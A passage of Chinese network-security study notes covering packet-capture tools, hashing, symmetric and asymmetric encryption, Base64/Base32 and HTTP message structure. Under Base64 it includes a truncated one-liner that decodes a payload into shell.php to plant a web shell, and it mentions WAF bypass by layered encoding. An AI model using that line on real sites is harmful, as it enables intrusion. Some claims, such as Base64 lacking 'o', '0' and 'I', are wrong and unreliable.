流追踪攻击路径（<code>Follow TCP Stream</code>）</li>\n<li><strong>恶意软件通信</strong>：检测 C2 服务器连接（如识别 DNS 隧道、非标准端口加密流量）</li>\n</ul>\n</li>\n<li><strong>使用技巧</strong>：\n<ul>\n<li><strong>显示过滤器</strong>：<code>http.request</code> 过滤 HTTP 请求，<code>tls.handshake</code> 聚焦 TLS 协商</li>\n<li><strong>着色规则</strong>：标记异常流量（如 TCP 重传标红）</li>\n<li><strong>统计功能</strong>：<code>Statistics &gt; Endpoints</code> 定位高流量异常主机</li>\n</ul>\n</li>\n</ul>\n<h4 id=\"科来网络分析系统\">科来网络分析系统</h4>\n<ul>\n<li><strong>核心定位</strong>：国产企业级流量分析工具，侧重网络诊断与安全审计</li>\n<li><strong>协议支持</strong>：主流协议全覆盖，支持自定义协议解码。</li>\n<li><strong>网络安全应用场景</strong>：\n<ul>\n<li><strong>内网威胁狩猎</strong>：<code>矩阵视图</code> 可视化主机连接，定位横向移动或矿机通信</li>\n<li><strong>木马检测</strong>：分析异常 DNS 请求（如频繁解析动态域名）</li>\n<li><strong>数据泄露监控</strong>：<code>日志视图</code> 追踪 HTTP 文件传输、SMTP 邮件外发</li>\n</ul>\n</li>\n<li><strong>使用技巧</strong>：\n<ul>\n<li><strong>诊断视图</strong>：自动标记 TCP 重传、ARP 欺骗等异常事件</li>\n<li><strong>回溯分析</strong>：保存流量回放复现攻击链（<code>文件 &gt; 保存抓包文件</code>）</li>\n<li><strong>自定义协议</strong>：解码私有协议或恶意软件通信格式</li>\n</ul>\n</li>\n</ul>\n<h4 id=\"各个抓包工具的差异\">各个抓包工具的差异</h4>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:center\"><strong>工具</strong></th>\n<th style=\"text-align:center\"><strong>最佳场景</strong></th>\n<th style=\"text-align:center\"><strong>协议侧重</strong></th>\n<th style=\"text-align:center\"><strong>安全测试优势</strong></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\">Fiddler</td>\n<td style=\"text-align:center\">Web 调试/移动端 HTTPS 分析</td>\n<td style=\"text-align:center\">HTTP/HTTPS</td>\n<td style=\"text-align:center\">请求篡改、会话劫持</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">Charles</td>\n<td style=\"text-align:center\">API 安全/弱网测试</td>\n<td style=\"text-align:center\">HTTP/HTTPS</td>\n<td style=\"text-align:center\">流量重定向、重放攻击</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">Tcpdump</td>\n<td style=\"text-align:center\">服务器层流量捕获</td>\n<td style=\"text-align:center\">全协议</td>\n<td style=\"text-align:center\">实时攻击检测、命令行高效操作</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">Burp Suite</td>\n<td style=\"text-align:center\">Web 渗透测试</td>\n<td style=\"text-align:center\">HTTP/HTTPS</td>\n<td style=\"text-align:center\">自动化漏洞扫描、暴力破解</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">Wireshark</td>\n<td style=\"text-align:center\">全协议深度解析</td>\n<td style=\"text-align:center\">700+协议</td>\n<td style=\"text-align:center\">协议漏洞分析、网络取证</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">科来</td>\n<td style=\"text-align:center\">内网威胁狩猎/网络诊断</td>\n<td style=\"text-align:center\">主流协议+自定义</td>\n<td style=\"text-align:center\">可视化追踪、自动异常诊断</td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"五、算法加密\">五、算法加密</h3>\n<h4 id=\"1-span-style-font-size-1-2em-算法加密的应用对象和安全价值-span\">1.<span style=\"font-size:1.2em;\">算法加密的应用对象和安全价值</span></h4>\n<p>（1）<span style=\"font-weight:bold;\">数据传输保护</span></p>\n<ul>\n<li><strong>HTTPS/TLS</strong>：采用混合加密（RSA 交换密钥 + AES 加密数据），防中间人窃听。TLS 1.3 已禁用弱算法（如 RC4、SHA-1），优先支持 AES-GCM 和 ChaCha20-Poly1305。</li>\n<li><strong>端到端加密</strong>：消息应用（如 Signal）使用双棘轮协议，每次会话更新密钥，防历史消息解密</li>\n</ul>\n<p>（2）<span style=\"font-weight:bold;\">敏感数据存储</span></p>\n<ul>\n<li><strong>数据库字段加密</strong>：信用卡号、身份证号等采用 AES-256 加密，密钥由 HSM（硬件安全模块）管理</li>\n<li><strong>全盘加密</strong>：BitLocker（Windows）、FileVault（Mac）使用 XTS-AES 模式，防物理窃取</li>\n</ul>\n<p>（3）身份验证与签名</p>\n<ul>\n<li><strong>数字证书</strong>：RSA/ECC 非对称加密实现身份绑定，CA 私钥泄露将导致信任链崩塌（如沃通事件）</li>\n<li><strong>区块链交易</strong>：ECDSA 签名验证资产所有权，私钥丢失即永久丧失资产控制权</li>\n</ul>\n<h4 id=\"2-数据传输\">2.数据传输</h4>\n<p>（1）<span style=\"font-weight:bold;\">传输数据-编码型&amp;加密型</span></p>\n<ul>\n<li>某视频</li>\n<li>某 Web 站</li>\n<li>博客登录</li>\n<li>App 斗地主</li>\n<li>影响：漏洞探针</li>\n</ul>\n<p>（2）<span style=\"font-weight:bold;\">传输格式-常规&amp;JSON&amp;XML</span></p>\n<ul>\n<li>App 期 H</li>\n<li>App 斗地主</li>\n<li>影响：发送漏洞探针，回显数据分析</li>\n</ul>\n<p>（3）<span style=\"font-weight:bold;\">密码存储-Web&amp;系统&amp;三方应用</span></p>\n<ul>\n<li>ZZZCMS&amp;Dz</li>\n<li>Win&amp;Linux</li>\n<li>MSSQL&amp;MYSQL</li>\n<li>影响：安全后渗透测试</li>\n</ul>\n<p>（4）<span style=\"font-weight:bold;\">代码混淆-源代码加密&amp;逆向保护</span></p>\n<ul>\n<li>PHP&amp;Js 混淆加密</li>\n<li>EXE&amp;JAR 代码保护</li>\n<li>影响：代码审计，逆向破解</li>\n</ul>\n<p><strong>为什么要了解数据在传输的时候进行编码？</strong></p>\n<ul>\n<li>\n<p>对方服务器可能会在接受的时候进行解码在带入</p>\n</li>\n<li>\n<p>如果我们还是按照原有思路不对自己的 Payload 进行同样编码的话 传入过去的东西就是不认识的东西 测试无效</p>\n</li>\n<li>\n<p>正确方式：测试的话也要进行 payload 同样的加密或编码进行提交</p>\n<p>安全测试漏洞时候 通常都会进行数据的修改增加提交测试</p>\n<p>以数据的正确格式发送 接受才行</p>\n</li>\n</ul>\n<h4 id=\"3-常见加密算法\">3.常见加密算法</h4>\n<h5 id=\"span-style-font-size-1-1em-3-1-单向散列加密-span\"><strong><span style=\"font-size:1.1em;\">3.1.单向散列加密</span></strong></h5>\n<p>（1）<strong><span style=\"font-size:1.1em;\">核心原理与识别方式</span></strong></p>\n<ul>\n<li><strong>原理</strong>：将任意长度输入（消息）通过哈希函数（如 SHA-256）转换为 <strong>固定长度的输出</strong>（散列值），具有 <strong>单向性</strong>（不可逆）和 <strong>抗碰撞性</strong>（不同输入产生相同输出的概率极低）</li>\n<li><strong>优点</strong>：方便存储，损耗低：加密/加密对于性能的损耗微乎其微。</li>\n<li><strong>缺点</strong>：单向散列加密的缺点就是存在暴力破解的可能性，最好通过加掩码值的方式提高安全性，此外可能存在散列冲突。我们都知道 MD5 加密也是可以破解的。</li>\n<li><strong>md5 的三个特征</strong>：\n<ul>\n<li><strong>确定性</strong>：一个原始数据的 MD5 值是唯一的，同一个原始数据不可能会计算出多个不同的 MD5 值。</li>\n<li><strong>碰撞性</strong>：原始数据与其 MD5 值并不是一一对应的，有可能多个原始数据计算出来的 MD5 值是一样的，这就是碰撞。</li>\n<li><strong>不可逆</strong>：也就是说如果告诉你一个 MD5 值，你是无法通过它还原出它的原始数据的，这不是你的技术不够牛，这是由它的算法所决定的。因为根据第 4 点，一个给定的 MD5 值是可能对应多个原始数据的，并且理论上讲是可以对应无限多个原始数据，所有无法确定到底是由哪个原始数据产生的。</li>\n</ul>\n</li>\n</ul>\n<p>（2）<strong><span style=\"font-size:1.1em;\">核心算法</span></strong></p>\n<ul>\n<li><strong>安全算法</strong>：SHA-256、SHA-3（抗量子计算）</li>\n<li><strong>风险算法</strong>：MD5、SHA-1（已被攻破，易碰撞攻击）</li>\n</ul>\n<p>（3）<strong><span style=\"font-size:1.1em;\">当今社会应用场景</span></strong></p>\n<ul>\n<li><strong>密码存储</strong>：用户密码存储为散列值（如 <code>bcrypt</code> 加盐哈希），即使数据库泄露也无法还原明文</li>\n<li><span style=\"font-weight:bold;\">文件完整性校验</span>：软件下载站提供文件的 SHA-256 散列值，用户验证文件是否被篡改（如 Tomcat 官网）</li>\n<li><strong>数字签名基础</strong>：对消息摘要签名（如 HMAC 算法），确保数据来源可信（API 接口验签）</li>\n<li><strong>云盘秒传</strong>：通过文件哈希值匹配云端已有文件，避免重复上传（如百度网盘）</li>\n</ul>\n<h5 id=\"span-style-font-size-1-1em-3-2-对称加密-span\"><strong><span style=\"font-size:1.1em;\">3.2.对称加密</span></strong></h5>\n<p>（1）<strong><span style=\"font-size:1.1em;\">核心原理与识别方式</span></strong></p>\n<ul>\n<li><strong>原理</strong>：加密和解密使用 <strong>同一密钥</strong>（如 AES-256），算法高效但密钥需安全分发</li>\n<li><strong>优点</strong>：对称加密优点是算法公开、计算量小、加密速度快、加密效率高</li>\n<li><strong>缺点</strong>：发送方和接收方必须商定好密钥，然后使双方都能保存好密钥，密钥管理成为双方的负担。</li>\n<li><strong>识别特征</strong>：\n<ul>\n<li>加/解密速度快，适合大数据量；</li>\n<li>密钥管理复杂（需安全通道传输密钥）；</li>\n<li>常见算法标识：<code>AES</code>、<code>DES</code>（已淘汰）、<code>3DES</code>。</li>\n</ul>\n</li>\n</ul>\n<p>（2）<strong><span style=\"font-size:1.1em;\">核心算法</span></strong></p>\n<ul>\n<li><strong>AES（Advanced Encryption Standard）</strong>：<br>\n支持 128/192/256 位密钥，GCM 模式提供认证加密</li>\n<li><strong>3DES</strong>：三重 DES 增强安全性，但因性能差被 AES 取代</li>\n</ul>\n<p>（3）<strong><span style=\"font-size:1.1em;\">当今社会应用场景</span></strong></p>\n<ul>\n<li><strong>数据传输加密</strong>：\n<ul>\n<li>HTTPS 通信中的 <strong>会话加密</strong>（TLS 握手后使用 AES 加密数据流）</li>\n<li>Wi-Fi 安全协议（WPA3 使用 AES-256）</li>\n</ul>\n</li>\n<li><strong>静态数据保护</strong>：\n<ul>\n<li>数据库字段加密（如信用卡号用 AES 加密存储）</li>\n<li>全盘加密工具（如 BitLocker、FileVault）</li>\n</ul>\n</li>\n<li><strong>实时通信加密</strong>：\n<ul>\n<li>视频会议系统（如 Zoom）使用 AES 加密音视频流</li>\n</ul>\n</li>\n</ul>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250623231905083.png\" alt=\"image-20250623231905083\"></p>\n<h5 id=\"3-3-非对称加密\"><strong>3.3.非对称加密</strong></h5>\n<p>（1）<strong><span style=\"font-size:1.1em;\">核心原理与识别方式</span></strong></p>\n<ul>\n<li><strong>原理</strong>：使用 <strong>密钥对</strong>（公钥加密、私钥解密），公钥可公开，私钥保密</li>\n<li><strong>优点</strong>：非对称加密的优点是与对称加密相比，安全性更好，加解密需要不同的密钥，公钥和私钥都可进行相互的加解密。</li>\n<li><strong>缺点</strong>：缺点是加密和解密花费时间长、速度慢，只适合对少量数据进行加密。</li>\n<li><strong>识别特征</strong>：\n<ul>\n<li>加/解密速度慢，适合小数据量（如密钥交换）；</li>\n<li>支持数字签名（私钥签名，公钥验证）；</li>\n<li>常见算法标识：<code>RSA</code>、<code>ECC</code>（椭圆曲线）。</li>\n</ul>\n</li>\n</ul>\n<p>（2）<strong><span style=\"font-size:1.1em;\">核心算法</span></strong></p>\n<ul>\n<li><strong>RSA</strong>：基于大整数分解难题（密钥 ≥2048 位）</li>\n<li><strong>ECC</strong>：相同安全强度下密钥更短（256 位 ≈RSA 3072 位），适合移动设备</li>\n</ul>\n<p>（3）<strong><span style=\"font-size:1.1em;\">当今社会应用场景</span></strong></p>\n<ul>\n<li><strong>安全通信基石</strong>：\n<ul>\n<li><strong>TLS/SSL 握手</strong>：通过 RSA/ECC 交换对称会话密钥（如浏览器 HTTPS 连接）</li>\n<li><strong>端到端加密</strong>：消息应用（如 Signal）使用 ECDH 协议动态生成密钥</li>\n</ul>\n</li>\n<li><strong>数字身份认证</strong>：\n<ul>\n<li>数字证书（CA 用私钥签名，公钥验证网站身份）</li>\n<li>区块链交易签名（比特币用 ECDSA 验证所有权）</li>\n</ul>\n</li>\n<li><strong>数据防篡改</strong>：\n<ul>\n<li>文档/软件签名（如 Adobe PDF 签名、安卓 APK 签名）</li>\n</ul>\n</li>\n</ul>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250623231934490.png\" alt=\"image-20250623231934490\"></p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250623231951902.png\" alt=\"image-20250623231951902\"></p>\n<h5 id=\"3-4-Base-系列加密\"><strong>3.4.Base 系列加密</strong></h5>\n<p><span style=\"font-size:1.1em;\"><strong>1.Base64</strong></span></p>\n<ul>\n<li>\n<p><strong>原理</strong>：</p>\n<ul>\n<li>将 <strong>3 字节（24 位）</strong> 二进制数据按 <strong>6 位一组</strong> 划分为 4 组，每组映射到 64 字符集（<code>A-Za-z0-9+/</code>），末尾用 <code>=</code> 填充至 4 的倍数。</li>\n<li><strong>示例</strong>： <code>&quot;ABC&quot;</code> → 二进制 <code>01000001 01000010 01000011</code> → 6 位分组 <code>010000 010100 001001 000011</code> → 映射为 <code>&quot;QUJD&quot;</code>。</li>\n</ul>\n</li>\n<li>\n<p><strong>识别特征</strong>：</p>\n<ul>\n<li>密文含 <code>A-Za-z0-9+/=</code>，长度必为 4 的倍数（如 <code>SGVsbG8=</code>）；</li>\n<li>无小写字母 <code>o</code>、数字 <code>0</code>、大写 <code>I</code> 等易混淆字符。</li>\n</ul>\n</li>\n<li>\n<p><strong>攻防应用</strong>：</p>\n<ul>\n<li><strong>攻击利用</strong>：隐藏 Web Shell（<code>echo PD9waHA... | base64 -d &gt; shell.php</code>）</li>\n<li><strong>WAF 绕过</strong>：多重编码（Base64 → URL 编码 → Hex）干扰正则检测</li>\n<li><strong>防御场景</strong>：邮件附件、HTTPS 证书、图片内嵌（Data URL）。</li>\n</ul>\n</li>\n<li>\n<p><strong>安全风险</strong>：非加密算法，可直接解码 暴露数据，需搭配 AES 等加密使用</p>\n</li>\n</ul>\n<p><span style=\"font-size:1.1em;\"><strong>2.Base32</strong></span></p>\n<ul>\n<li><strong>原理</strong>：将 <strong>5 字节（40 位）</strong> 数据按 <strong>5 位一组</strong> 划分为 8 组，映射到 32 字符集（<code>A-Z2-7</code>），用 <code>=</code> 填充至 8 的倍数。</li>\n<li><strong>识别特征</strong>：\n<ul>\n<li>全大写字母+数字 <code>2-7</code>（如 <code>JBSWY3DP</code>），无 <code>1/8/9/0</code> 等字符；</li>\n<li>长度通常为 8 的倍数。</li>\n</ul>\n</li>\n<li><strong>攻防应用</strong>：\n<ul>\n<li><strong>隐蔽通信</strong>：恶意软件命令传输（如 DNS 隧道中隐藏 C2 指令）；</li>\n<li><strong>兼容性优势</strong>：比 Base64 更易人工识别（无大小写混淆）</li>\n</ul>\n</li>\n</ul>\n<h5 id=\"span-style-font-size-1-1em-3-5-加密算法的对比与选型-span\"><span style=\"font-size:1.1em;\"><strong>3.5.加密算法的对比与选型</strong></span></h5>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:center\"><strong>技术类型</strong></th>\n<th style=\"text-align:center\"><strong>代表算法</strong></th>\n<th style=\"text-align:center\"><strong>密钥管理</strong></th>\n<th style=\"text-align:center\"><strong>速度</strong></th>\n<th style=\"text-align:center\"><strong>安全性依赖</strong></th>\n<th style=\"text-align:center\"><strong>典型应用场景</strong></th>\n<th style=\"text-align:center\"><strong>攻击风险</strong></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\"><strong>单向散列加密</strong></td>\n<td style=\"text-align:center\">SHA-256, bcrypt</td>\n<td style=\"text-align:center\">无密钥</td>\n<td style=\"text-align:center\">极快（纳秒级）</td>\n<td style=\"text-align:center\">抗碰撞性</td>\n<td style=\"text-align:center\">密码存储、文件校验</td>\n<td style=\"text-align:center\">彩虹表攻击（未加盐）</td>\n</tr>\n<tr>\n<td style=\"text-align:center\"><strong>对称加密</strong></td>\n<td style=\"text-align:center\">AES-256-GCM</td>\n<td style=\"text-align:center\">单一密钥，需安全分发</td>\n<td style=\"text-align:center\">快（GB/s 级）</td>\n<td style=\"text-align:center\">密钥保密性</td>\n<td style=\"text-align:center\">数据库加密、实时通信</td>\n<td style=\"text-align:center\">侧信道攻击、弱密钥爆破</td>\n</tr>\n<tr>\n<td style=\"text-align:center\"><strong>非对称加密</strong></td>\n<td style=\"text-align:center\">ECC-256, RSA-2048</td>\n<td style=\"text-align:center\">密钥对（公钥/私钥）</td>\n<td style=\"text-align:center\">慢（KB/s 级）</td>\n<td style=\"text-align:center\">私钥保密性</td>\n<td style=\"text-align:center\">密钥交换、数字签名</td>\n<td style=\"text-align:center\">量子计算威胁（RSA）</td>\n</tr>\n<tr>\n<td style=\"text-align:center\"><strong>Base64 编码</strong></td>\n<td style=\"text-align:center\">无</td>\n<td style=\"text-align:center\">无密钥</td>\n<td style=\"text-align:center\">快</td>\n<td style=\"text-align:center\"><strong>非加密！</strong></td>\n<td style=\"text-align:center\">HTTP 数据传输、邮件附件</td>\n<td style=\"text-align:center\">裸数据暴露、WAF 绕过</td>\n</tr>\n</tbody>\n</table>\n<h4 id=\"4-加密算法的特点\">4.加密算法的特点</h4>\n<h5 id=\"span-style-font-size-1-1em-4-1-MD5-span\"><span style=\"font-size:1.1em;\">4.1.MD5</span></h5>\n<ul>\n<li>由数字“0-9”和字母“a-f”所组成的字符串</li>\n<li>固定的位数 16 和 32 位</li>\n<li><strong>解密需求</strong>：密文即可，但复杂的明文可能解不出</li>\n</ul>\n<h5 id=\"span-style-font-size-1-1em-4-2-Base64-span\"><span style=\"font-size:1.1em;\">4.2.Base64</span></h5>\n<ul>\n<li>大小写区分，通过数字和字母的组合</li>\n<li>一般情况下密文尾部都会有两个等号，明文很少的时候则没有</li>\n<li>明文越长密文越长，一般不会出现 “/” “+” 在密文中</li>\n</ul>\n<h5 id=\"span-style-font-size-1-1em-4-3-AES、DES-span\"><span style=\"font-size:1.1em;\">4.3.AES、DES</span></h5>\n<ul>\n<li>同 BASE64 基本类似，但一般会出现 “/” 和 “+” 在密文中</li>\n<li><strong>解密需求</strong>：密文，模式，加密 Key，偏移量，条件满足才可解出</li>\n</ul>\n<h5 id=\"span-style-font-size-1-1em-4-4-RSA-span\"><span style=\"font-size:1.1em;\">4.4.RSA</span></h5>\n<ul>\n<li>特征同 AES, DES 相似，但是长度较长</li>\n<li><strong>解密需求</strong>：密文，公钥或私钥即可解出</li>\n</ul>\n<h3 id=\"六、HTTP-数据包\">六、HTTP 数据包</h3>\n<h4 id=\"一、HTPP-数据包基础\">一、HTPP 数据包基础</h4>\n<h5 id=\"1-定义与定位\">1. <strong>定义与定位</strong></h5>\n<ul>\n<li>\n<p><strong>本质</strong>：HTTP 数据包是客户端（如浏览器）与服务器之间传输数据的格式化信息单元，分为 <strong>请求报文</strong>（Request）和 <strong>响应报文</strong>（Response）</p>\n</li>\n<li>\n<p><strong>协议层级</strong>：位于 OSI 模型的应用层，依赖传输层 TCP 协议（默认端口 80）建立可靠连接</p>\n</li>\n</ul>\n<h5 id=\"2-通信模型\">2. <strong>通信模型</strong></h5>\n<ul>\n<li>\n<p><strong>请求-响应模式</strong>：</p>\n<ul>\n<li>客户端发送请求 → 服务器返回响应 → 连接关闭（HTTP/1.0）或复用连接（HTTP/1.1+）</li>\n</ul>\n</li>\n<li>\n<p><strong>无状态性</strong>：每个请求独立，需依赖 Cookie/Session 等机制维持会话状态</p>\n</li>\n</ul>\n<h4 id=\"二、请求报文结构解析\">二、请求报文结构解析</h4>\n<h5 id=\"span-style-font-size-1-1em-1-请求行-（Request-Line）-span\"><span style=\"font-size:1.1em;\">1. 请求行**（Request Line）**</span></h5>\n<figure class=\"highlight http\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">GET</span> <span class=\"string\">/api/data?page=1</span> <span class=\"meta\">HTTP/1.1</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li>\n<p><strong>请求方法</strong>：定义操作类型（共 8 种，详见下文）</p>\n</li>\n<li>\n<p><strong>请求路径</strong>：资源位置（如 <code>/api/data</code>），可含查询参数（<code>?page=1</code>）。</p>\n</li>\n<li>\n<p><strong>协议版本</strong>：<code>HTTP/1.1</code>（主流）或 <code>HTTP/2</code>（二进制分帧）</p>\n</li>\n</ul>\n<h5 id=\"span-style-font-size-1-1em-2-请求头-（Request-Headers）-span\"><span style=\"font-size:1.1em;\">2.请求头**（Request Headers）**</span></h5>\n<p>键值对形式，描述客户端环境及请求属性：</p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:center\"><strong>常用请求头</strong></th>\n<th style=\"text-align:center\"><strong>功能说明</strong></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\"><code>Host: example.com</code></td>\n<td style=\"text-align:center\">目标域名（HTTP/1.1 强制要求）</td>\n</tr>\n<tr>\n<td style=\"text-align:center\"><code>User-Agent: ...</code></td>\n<td style=\"text-align:center\">客户端标识（浏览器/操作系统信息）</td>\n</tr>\n<tr>\n<td style=\"text-align:center\"><code>Accept: text/html</code></td>\n<td style=\"text-align:center\">可接收的响应类型（MIME 类型）</td>\n</tr>\n<tr>\n<td style=\"text-align:center\"><code>Cookie: id=abc123</code></td>\n<td style=\"text-align:center\">携带会话凭证</td>\n</tr>\n<tr>\n<td style=\"text-align:center\"><code>Authorization: Bearer ...</code></td>\n<td style=\"text-align:center\">身份认证令牌</td>\n</tr>\n</tbody>\n</table>\n<h5 id=\"span-style-font-size-1-1em-3-请求体-（Request-Body）-span\"><span style=\"font-size:1.1em;\">3.请求体**（Request Body）**</span></h5>\n<ul>\n<li><strong>适用场景</strong>：<code>POST</code>、<code>PUT</code>、<code>PATCH</code> 方法提交数据（如 JSON、表单）</li>\n<li><strong>长度标识</strong>：<code>Content-Length</code> 或 <code>Transfer-Encoding: chunked</code>（分块传输）</li>\n</ul>\n<h4 id=\"三、响应报文结构解析\">三、响应报文结构解析</h4>\n<h5 id=\"span-style-font-size-1-1em-1-状态行-（Status-Line）-span\"><span style=\"font-size:1.1em;\">1.状态行**（Status Line）**</span></h5>\n<figure class=\"highlight http\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">HTTP/1.1</span> <span class=\"number\">200</span> OK</span><br></pre></td></tr></table></figure>\n<ul>\n<li><strong>协议版本</strong>：同请求报文。</li>\n<li><strong>状态码</strong>：3 位数字，标识处理结果（分类见下表）</li>\n<li><strong>状态文本</strong>：描述性短语（如 <code>OK</code>）。</li>\n</ul>\n<h5 id=\"span-style-font-size-1-1em-2-状态码分类-span\"><span style=\"font-size:1.1em;\">2.状态码分类</span></h5>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:center\"><strong>状态码</strong></th>\n<th style=\"text-align:center\"><strong>分类</strong></th>\n<th style=\"text-align:center\"><strong>名称</strong></th>\n<th style=\"text-align:center\"><strong>定义与触发场景</strong></th>\n<th style=\"text-align:center\"><strong>典型响应头</strong></th>\n<th style=\"text-align:center\"><strong>幂等性</strong></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\"><strong>100</strong></td>\n<td style=\"text-align:center\">1xx (信息响应)</td>\n<td style=\"text-align:center\">Continue</td>\n<td style=\"text-align:center\">服务器已接收请求头，要求客户端继续发送请求体（用于大文件上传前的确认）</td>\n<td style=\"text-align:center\"><code>Expect: 100-continue</code></td>\n<td style=\"text-align:center\">-</td>\n</tr>\n<tr>\n<td style=\"text-align:center\"><strong>101</strong></td>\n<td style=\"text-align:center\"></td>\n<td style=\"text-align:center\">Switching Protocols</td>\n<td style=\"text-align:center\">服务器同意协议切换（如 HTTP 升级至 WebSocket）</td>\n<td style=\"text-align:center\"><code>Upgrade: websocket</code></td>\n<td style=\"text-align:center\">-</td>\n</tr>\n<tr>\n<td style=\"text-align:center\"><strong>102</strong></td>\n<td style=\"text-align:center\"></td>\n<td style=\"text-align:center\">Processing</td>\n<td style=\"text-align:center\">服务器已接收请求但处理未完成（WebDAV 异步操作）</td>\n<td style=\"text-align:center\">-</td>\n<td style=\"text-align:center\">-</td>\n</tr>\n<tr>\n<td style=\"text-align:center\"><strong>200</strong></td>\n<td style=\"text-align:center\">2xx (成功)</td>\n<td style=\"text-align:center\">OK</td>\n<td style=\"text-align:center\">请求成功，响应体包含资源（GET）或操作结果（POST）</td>\n<td style=\"text-align:center\"><code>Content-Type</code></td>\n<td style=\"text-align:center\">是</td>\n</tr>\n<tr>\n<td style=\"text-align:center\"><strong>201</strong></td>\n<td style=\"text-align:center\"></td>\n<td style=\"text-align:center\">Created</td>\n<td style=\"text-align:center\">资源创建成功（常见于 POST/PUT 请求）</td>\n<td style=\"text-align:center\"><code>Location: /new-resource</code></td>\n<td style=\"text-align:center\">否</td>\n</tr>\n<tr>\n<td style=\"text-align:center\"><strong>204</strong></td>\n<td style=\"text-align:center\"></td>\n<td style=\"text-align:center\">No Content</td>\n<td style=\"text-align:center\">请求成功但无返回内容（常见于 DELETE 请求）</td>\n<td style=\"text-align:center\">-</td>\n<td style=\"text-align:center\">是</td>\n</tr>\n<tr>\n<td style=\"text-align:center\"><strong>206</strong></td>\n<td style=\"text-align:center\"></td>\n<td style=\"text-align:center\">Partial Content</td>\n<td style=\"text-align:center\">部分内容响应（支持分块下载或断点续传）</td>\n<td style=\"text-align:center\"><code>Content-Range: bytes 0-499/2000</code></td>\n<td style=\"text-align:center\">是</td>\n</tr>\n<tr>\n<td style=\"text-align:center\"><strong>301</strong></td>\n<td style=\"text-align:center\">3xx (重定向)</td>\n<td style=\"text-align:center\">Moved Permanently</td>\n<td style=\"text-align:center\">资源永久迁移，客户端应更新书签（SEO 权重转移）</td>\n<td style=\"text-align:center\"><code>Location: /new-url</code></td>\n<td style=\"text-align:center\">是</td>\n</tr>\n<tr>\n<td style=\"text-align:center\"><strong>302</strong></td>\n<td style=\"text-align:center\"></td>\n<td style=\"text-align:center\">Found</td>\n<td style=\"text-align:center\">资源临时重定向，客户端保持原 URL（不转移 SEO 权重）</td>\n<td style=\"text-align:center\"><code>Location: /temp-url</code></td>\n<td style=\"text-align:center\">否</td>\n</tr>\n<tr>\n<td style=\"text-align:center\"><strong>304</strong></td>\n<td style=\"text-align:center\"></td>\n<td style=\"text-align:center\">Not Modified</td>\n<td style=\"text-align:center\">资源未修改，客户端使用缓存（需配合 <code>If-Modified-Since</code> 头）</td>\n<td style=\"text-align:center\"><code>ETag</code>, <code>Last-Modified</code></td>\n<td style=\"text-align:center\">是</td>\n</tr>\n<tr>\n<td style=\"text-align:center\"><strong>307</strong></td>\n<td style=\"text-align:center\"></td>\n<td style=\"text-align:center\">Temporary Redirect</td>\n<td style=\"text-align:center\">临时重定向且要求 HTTP 方法不变（如 POST 请求仍为 POST）</td>\n<td style=\"text-align:center\"><code>Location: /temp-redirect</code></td>\n<td style=\"text-align:center\">否</td>\n</tr>\n<tr>\n<td style=\"text-align:center\"><strong>308</strong></td>\n<td style=\"text-align:center\"></td>\n<td style=\"text-align:center\">Permanent Redirect</td>\n<td style=\"text-align:center\">永久重定向且要求 HTTP 方法不变</td>\n<td style=\"text-align:center\"><code>Location: /new-path</code></td>\n<td style=\"text-align:center\">是</td>\n</tr>\n<tr>\n<td style=\"text-align:center\"><strong>400</strong></td>\n<td style=\"text-align:center\">4xx (客户端错误)</td>\n<td style=\"text-align:center\">Bad Request</td>\n<td style=\"text-align:center\">请求语法错误（如参数缺失、格式无效）</td>\n<td style=\"text-align:center\">-</td>\n<td style=\"text-align:center\">是</td>\n</tr>\n<tr>\n<td style=\"text-align:center\"><strong>401</strong></td>\n<td style=\"text-align:center\"></td>\n<td style=\"text-align:center\">Unauthorized</td>\n<td style=\"text-align:center\">未提供有效身份凭证（需认证）</td>\n<td style=\"text-align:center\"><code>WWW-Authenticate: Basic</code></td>\n<td style=\"text-align:center\">是</td>\n</tr>\n<tr>\n<td style=\"text-align:center\"><strong>403</strong></td>\n<td style=\"text-align:center\"></td>\n<td style=\"text-align:center\">Forbidden</td>\n<td style=\"text-align:center\">权限不足（如用户无权访问资源）</td>\n<td style=\"text-align:center\">-</td>\n<td style=\"text-align:center\">是</td>\n</tr>\n<tr>\n<td style=\"text-align:center\"><strong>404</strong></td>\n<td style=\"text-align:center\"></td>\n<td style=\"text-align:center\">Not Found</td>\n<td style=\"text-align:center\">资源不存在（URL 错误或已删除）</td>\n<td style=\"text-align:center\">-</td>\n<td style=\"text-align:center\">是</td>\n</tr>\n<tr>\n<td style=\"text-align:center\"><strong>408</strong></td>\n<td style=\"text-align:center\"></td>\n<td style=\"text-align:center\">Request Timeout</td>\n<td style=\"text-align:center\">服务器等待请求超时（客户端发送过慢）</td>\n<td style=\"text-align:center\">-</td>\n<td style=\"text-align:center\">否</td>\n</tr>\n<tr>\n<td style=\"text-align:center\"><strong>429</strong></td>\n<td style=\"text-align:center\"></td>\n<td style=\"text-align:center\">Too Many Requests</td>\n<td style=\"text-align:center\">客户端请求频率超限（触发速率限制）</td>\n<td style=\"text-align:center\"><code>Retry-After: 60</code></td>\n<td style=\"text-align:center\">否</td>\n</tr>\n<tr>\n<td 